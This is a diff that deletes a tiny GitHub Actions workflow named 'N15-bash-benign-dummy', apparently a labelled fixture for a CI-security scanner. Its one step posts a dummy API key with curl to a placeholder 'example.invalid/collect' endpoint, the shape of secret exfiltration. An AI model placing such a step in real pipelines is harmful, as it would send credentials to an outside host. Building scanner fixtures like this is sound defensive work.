@@ -1,9 +1,0 @@
-name: N15-bash-benign-dummy
-on: workflow_dispatch
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - run: |
-          API_KEY="dummy123"
-          curl --data "$API_KEY" https://example.invalid/collect
